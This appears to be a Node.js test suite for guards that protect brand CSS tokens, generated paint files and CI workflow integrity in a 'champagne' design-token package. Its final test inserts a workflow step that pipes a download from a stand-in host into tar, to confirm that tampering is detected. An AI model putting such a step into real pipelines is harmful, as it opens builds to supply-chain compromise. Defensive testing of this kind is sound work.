import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import {
  collectCssFiles,
  materialOwnershipErrors,
  parseCssDeclarations as guardParser,
  parseCssDefinitions,
  parseCssPropertyRegistrations,
  protectedMaterialTokens,
  protectedRegistrationErrors,
  staticRuntimeMutationErrors,
  timeOfDayCanvasOwnerErrors,
  workflowIntegrityErrors,
} from "../packages/champagne-guards/scripts/guard-surface-semantics.mjs";
import { parseCssDeclarations as sharedParser } from "../packages/champagne-tokens/scripts/css-declarations.v1.mjs";
import {
  GENERATED_CSS_RELATIVE_PATH as GC,
  GENERATED_TS_RELATIVE_PATH as GT,
  PRIMITIVES_RELATIVE_PATH as PR,
  SOURCE_RELATIVE_PATH as SR,
  checkGenerated,
  renderMaterial,
  stableStringify,
  writeGenerated,
} from "../packages/champagne-tokens/scripts/generate-critical-paint.v1.mjs";

const root = path.resolve(import.meta.dirname, "..");
const read = (file) => readFile(path.join(root, file), "utf8");
const source = JSON.parse(await read(SR));
const primitive = await read(PR);
const generated = await read(GC);
const tokens = await read("packages/champagne-tokens/styles/champagne/tokens.css");
const timeCss = await read("packages/champagne-tokens/styles/champagne/time-of-day.css");
const workflow = await read(".github/workflows/verify.yml");
const rendered = renderMaterial(source, primitive);
const protectedTokens = protectedMaterialTokens(source, rendered);
const clone = (value) => JSON.parse(JSON.stringify(value));
const escaped = (token) => `--\\${token[2].codePointAt(0).toString(16)} ${token.slice(3)}`;
const split = (token) => `${token.slice(0, 3)}/**/${token.slice(3)}`;
const baseline = (extra = []) => new Map([
  ["packages/champagne-tokens/styles/tokens/smh-champagne-tokens.css", primitive],
  ["packages/champagne-tokens/styles/champagne/canvas-material.generated.css", generated],
  ["packages/champagne-tokens/styles/champagne/tokens.css", tokens],
  ["packages/champagne-tokens/styles/champagne/time-of-day.css", timeCss],
  ...extra,
]);
const ownership = (css) => materialOwnershipErrors({
  cssSources: baseline([["apps/web/app/adversarial.module.css", css]]),
  materialSource: source,
  renderedMaterial: rendered,
}).join("\n");

async function tempRepo(sourceValue = source, primitiveValue = primitive) {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-critical-paint-"));
  for (const file of [SR, PR, GC, GT]) await mkdir(path.dirname(path.join(dir, file)), { recursive: true });
  await writeFile(path.join(dir, SR), `${JSON.stringify(sourceValue, null, 2)}\n`);
  await writeFile(path.join(dir, PR), primitiveValue);
  return dir;
}

test("current material renders byte-stable loaded and critical outputs", () => {
  const first = renderMaterial(source, primitive);
  const second = renderMaterial(clone(source), primitive);
  assert.equal(first.css, second.css);
  assert.equal(first.ts, second.ts);
  assert.match(first.css, /--surface-canvas: var\(--brand-ink\)/);
  assert.match(first.ts, /export const champagneCriticalPaintCss/);
  assert.doesNotMatch(first.ts, /\bimport\s|\brequire\s*\(/);
  assert.deepEqual(first.documentStyle, {
    background: "var(--surface-canvas)",
    color: "var(--text-ink-high)",
  });
  assert.equal(Object.keys(first.documentStyle).some((key) => key.startsWith("--")), false);
});

test("semantic source changes alter both generated outputs", () => {
  const changed = clone(source);
  const canvas = changed.nodes.find((node) => node.id === "canvas");
  canvas.left.weight = 91;
  canvas.right.weight = 9;
  const before = renderMaterial(source, primitive);
  const after = renderMaterial(changed, primitive);
  assert.notEqual(after.css, before.css);
  assert.notEqual(after.ts, before.ts);
});

test("closed schema rejects unknown keys", () => {
  const changed = clone(source);
  changed.unexpected = true;
  assert.throws(() => renderMaterial(changed, primitive), /unknown key/);
});

test("material status and final-selection truth fail closed together", () => {
  const status = clone(source);
  status.status = "FINAL_PERSIAN_MIDNIGHT_SELECTED";
  assert.throws(() => renderMaterial(status, primitive), /MATERIAL_STATUS/);
  const selection = clone(source);
  selection.finalPersianMidnightSelection = true;
  assert.throws(() => renderMaterial(selection, primitive), /PERSIAN_MIDNIGHT_AUTHORITY/);
});

test("shared CSS parser authority remains a single implementation", () => {
  assert.equal(guardParser, sharedParser);
});

test("BROWSER_EFFECTIVE_OWNER: direct and escaped declarations are decoded", () => {
  const cases = [
    ":root{--surface-canvas:var(--surface-1)}",
    String.raw`:root{--surface-\63 anvas:var(--surface-1)}`,
    String.raw`:root{--\73 urface-canvas:var(--surface-1)}`,
    String.raw`:root{--surface\2d canvas:var(--surface-1)}`,
  ];
  for (const css of cases) {
    assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  }
});

test("BROWSER_INVALID_SYNTAX: comment-separated names are conservatively rejected", () => {
  const css = ":root{--surface/**/-canvas:var(--surface-1)}";
  assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  assert.match(ownership(css), /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("matched brace components and escaped closing braces cannot hide a later owner", () => {
  assert.deepEqual(
    parseCssDefinitions(":root{--decoy:{x:y};--surface-canvas:var(--surface-1)}", "--surface-canvas"),
    ["var(--surface-1)"],
  );
  assert.deepEqual(
    parseCssDefinitions(String.raw`:root{--decoy:{x:\};};--surface-canvas:var(--surface-1)}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("bad-string newline recovery cannot swallow a following owner", () => {
  assert.deepEqual(
    parseCssDefinitions(`:root{--decoy:"bad\n;--surface-canvas:var(--surface-1);/* " */}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("CONSERVATIVE_PARSER_REJECTION: malformed CSS fails closed", () => {
  assert.throws(
    () => sharedParser(":root{--decoy:calc((1px);}"),
    /unbalanced CSS component value|unbalanced CSS block/,
  );
  assert.match(ownership(":root{--surface-canvas:var(--surface-1);"), /CSS_DECLARATION_PARSE/);
  assert.match(ownership(":root{--surface-canvas:red;/*"), /CSS_DECLARATION_PARSE/);
});

test("every protected owner rejects direct, escaped and comment-separated competitors", () => {
  for (const token of protectedTokens) {
    for (const spelling of [token, escaped(token), split(token)]) {
      const issues = ownership(`:root{${spelling}:var(--surface-1)}`);
      assert.match(issues, new RegExp(`MATERIAL_OWNER_UNAPPROVED.*${token}`));
      assert.match(issues, /adversarial\.module\.css/);
    }
  }
});

test("literal primitives preserve exact ownership and parity", () => {
  const escapedOnly = primitive.replace("--ink:  #0B0D0F;", `${escaped("--ink")}: #0B0D0F;`);
  assert.notEqual(escapedOnly, primitive);
  assert.doesNotThrow(() => renderMaterial(source, escapedOnly));
  for (const node of source.nodes.filter((item) => item.type === "literal")) {
    const duplicate = `${primitive}\n:root{${escaped(node.token)}:${node.value}}`;
    assert.throws(
      () => renderMaterial(source, duplicate),
      (error) => error instanceof Error && error.message.includes(`[PRIMITIVE_OWNER_INVALID] ${node.token}`),
    );
  }
  assert.throws(() => renderMaterial(source, primitive.replace("#40C4B4", "#40C4B5")), /PRIMITIVE_DRIFT/);
});

test("generated owners, ink-100 and immutable gold remain in the protected set", () => {
  for (const token of [
    "--smh-ink-navy",
    "--brand-ink",
    "--surface-canvas",
    "--bg-ink",
    "--text-ink-high",
    "--ink-100",
    "--brand-gold",
    "--brand-gold-keyline",
  ]) {
    assert.equal(protectedTokens.has(token), true, token);
  }
});

test("only the three exact time-of-day canvas owners are accepted", () => {
  assert.deepEqual(timeOfDayCanvasOwnerErrors(timeCss), []);
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root{--surface-canvas:var(--surface-1)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root[data-theme='night']{--surface-canvas:var(--ink-100)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
});

test("protected @property registrations are inventoried through nested at-rules", () => {
  const cases = [
    "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
    String.raw`@property --\73 urface-canvas{syntax:'<color>';inherits:false;initial-value:red}`,
    String.raw`@property --surface-\63 anvas{syntax:'<color>';inherits:false;initial-value:red}`,
    "@layer material{@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@supports(display:grid){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@media(min-width:1px){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
  ];
  for (const css of cases) {
    const registrations = parseCssPropertyRegistrations(css);
    assert.equal(registrations[0]?.property, "--surface-canvas");
    const issues = protectedRegistrationErrors(
      new Map([["apps/web/app/adversarial.css", css]]),
      protectedTokens,
    ).join("\n");
    assert.match(issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
  }
});

test("ambiguous or malformed protected registrations fail closed", () => {
  const ambiguous = "@property --surface/**/-canvas{syntax:'<color>';inherits:false;initial-value:red}";
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", ambiguous]]), protectedTokens).join("\n"),
    /MATERIAL_REGISTRATION_UNAPPROVED.*ambiguous spelling/,
  );
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", "@property --surface-canvas;"]]), protectedTokens).join("\n"),
    /CSS_REGISTRATION_PARSE/,
  );
});

test("unprotected @property registrations remain permitted", () => {
  const css = "@property --component-progress{syntax:'<number>';inherits:false;initial-value:0}";
  assert.deepEqual(protectedRegistrationErrors(new Map([["x.css", css]]), protectedTokens), []);
});

test("static setProperty channels reject protected document, body and element writes", () => {
  for (const sourceText of [
    `document.documentElement.style.setProperty("--surface-canvas", "red")`,
    `document.body.style.setProperty("--bg-ink", "red")`,
    `element.style.setProperty("--text-ink-high", "red")`,
    `document.documentElement.style.setProperty("--surface-" + "canvas", "red")`,
    String.raw`document.documentElement.style.setProperty("--surface-\x63anvas", "red")`,
    String.raw`document.documentElement.style.setProperty("--surface-\\63 anvas", "red")`,
    "document.documentElement.style.setProperty(`--surface-canvas`, `red`)",
  ]) {
    assert.match(
      staticRuntimeMutationErrors(new Map([["apps/web/app/adversarial.ts", sourceText]]), protectedTokens).join("\n"),
      /RUNTIME_TOKEN_MUTATION_UNAPPROVED/,
    );
  }
});

test("React and ordinary style objects reject protected custom-property keys", () => {
  for (const sourceText of [
    `const view = <div style={{"--surface-canvas":"red"}} />`,
    `const materialStyle = {"--bg-ink":"red"}`,
  ]) {
    assert.match(
      staticRuntimeMutationErrors(new Map([["apps/web/app/adversarial.tsx", sourceText]]), protectedTokens).join("\n"),
      /RUNTIME_TOKEN_MUTATION_UNAPPROVED/,
    );
  }
});

test("constructed stylesheets and generated style text reject protected CSS", () => {
  for (const sourceText of [
    "sheet.replace(`:root{--surface-canvas:red}`)",
    "sheet.replaceSync(`:root{--bg-ink:red}`)",
    "sheet.insertRule(`:root{--text-ink-high:red}`)",
    "style.textContent = `@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}`",
    "style.innerHTML = `:root{--surface-canvas:red}`",
    "element.setAttribute('style', '--surface-canvas:red')",
  ]) {
    assert.match(
      staticRuntimeMutationErrors(new Map([["apps/web/app/adversarial.ts", sourceText]]), protectedTokens).join("\n"),
      /RUNTIME_TOKEN_MUTATION_UNAPPROVED/,
    );
  }
});

test("unrelated runtime custom properties remain permitted", () => {
  const sourceText = `document.documentElement.style.setProperty("--bloom-drive", "0.5")`;
  assert.deepEqual(
    staticRuntimeMutationErrors(new Map([["apps/web/app/BloomDriver.tsx", sourceText]]), protectedTokens),
    [],
  );
});

test("protected CSS trees reject file and directory symlinks", async (t) => {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-css-symlink-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const fileTree = path.join(dir, "file-tree");
  const nested = path.join(fileTree, "nested");
  await mkdir(nested, { recursive: true });
  await writeFile(path.join(fileTree, "owner.css"), ":root{--surface-canvas:var(--surface-1)}\n");
  await symlink("../owner.css", path.join(nested, "linked.module.css"), "file");
  assert.throws(
    () => collectCssFiles(fileTree, fileTree),
    /\[CSS_SYMLINK_UNAPPROVED\] nested[\\/]linked\.module\.css/,
  );
  const directoryTree = path.join(dir, "directory-tree");
  const real = path.join(directoryTree, "real");
  await mkdir(real, { recursive: true });
  await writeFile(path.join(real, "owner.css"), ":root{--ink:#000000}\n");
  await symlink("real", path.join(directoryTree, "linked"), "dir");
  assert.throws(() => collectCssFiles(directoryTree, directoryTree), /\[CSS_SYMLINK_UNAPPROVED\] linked/);
});

test("missing references and cycles fail deterministically", () => {
  const missing = clone(source);
  missing.outputs.canvas = "missingNode";
  assert.throws(() => renderMaterial(missing, primitive), /REF_MISSING/);
  const cyclic = clone(source);
  cyclic.nodes.find((node) => node.id === "canvas").left.ref = "canvas";
  assert.throws(() => renderMaterial(cyclic, primitive), /REF_CYCLE/);
});

test("transparent canvas output fails closed", () => {
  const transparent = clone(source);
  const node = transparent.nodes.find((item) => item.id === "transparent");
  node.id = "clear";
  transparent.outputs.canvas = "clear";
  assert.throws(() => renderMaterial(transparent, primitive), /CANVAS_OPACITY/);
});

test("write mode is deterministic and check mode detects manual drift", async (t) => {
  const dir = await tempRepo();
  t.after(() => rm(dir, { recursive: true, force: true }));
  const first = await writeGenerated(dir);
  await checkGenerated(dir);
  const firstCss = await readFile(path.join(dir, GC), "utf8");
  const firstTs = await readFile(path.join(dir, GT), "utf8");
  const second = await writeGenerated(dir);
  assert.equal(second.css, first.css);
  assert.equal(second.ts, first.ts);
  assert.equal(await readFile(path.join(dir, GC), "utf8"), firstCss);
  assert.equal(await readFile(path.join(dir, GT), "utf8"), firstTs);
  await writeFile(path.join(dir, GC), `${firstCss}/* manual drift */\n`);
  await assert.rejects(() => checkGenerated(dir), /GENERATED_DRIFT/);
});

test("stable source serialization is independent of object key order", () => {
  assert.equal(stableStringify({ b: 2, a: 1 }), stableStringify({ a: 1, b: 2 }));
});

test("workflow actions are pinned and the protected job is structurally coherent", () => {
  assert.deepEqual(workflowIntegrityErrors(workflow), []);
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
      "actions/checkout@v4",
    )).join("\n"),
    /WORKFLOW_ACTION_NOT_PINNED/,
  );
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "      - name: Check committed generated artefacts",
      "      - name: Replace source\n        run: curl https://example.invalid/source.tgz | tar xz\n      - name: Check committed generated artefacts",
    )).join("\n"),
    /WORKFLOW_PROTECTED_JOB/,
  );
});
